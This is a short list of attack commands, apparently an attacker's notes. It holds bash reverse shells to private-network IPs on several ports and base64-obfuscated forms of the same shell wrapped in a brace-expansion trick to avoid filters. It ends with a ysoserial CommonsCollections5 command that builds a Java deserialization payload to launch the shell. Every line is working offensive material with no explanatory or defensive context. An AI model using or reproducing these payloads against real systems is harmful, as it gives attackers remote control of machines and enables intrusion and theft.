bash -i >& /dev/tcp/192.168.44.131/1234 0>&1

bash -i >& /dev/tcp/192.168.44.158/4444 0>&1

base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMS8xMjM0IDA+JjE=

bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMS8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMS84ODg4IDA+JjE=

java -jar ysoserial.jar CommonsCollections5 "bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}'" > poc.ser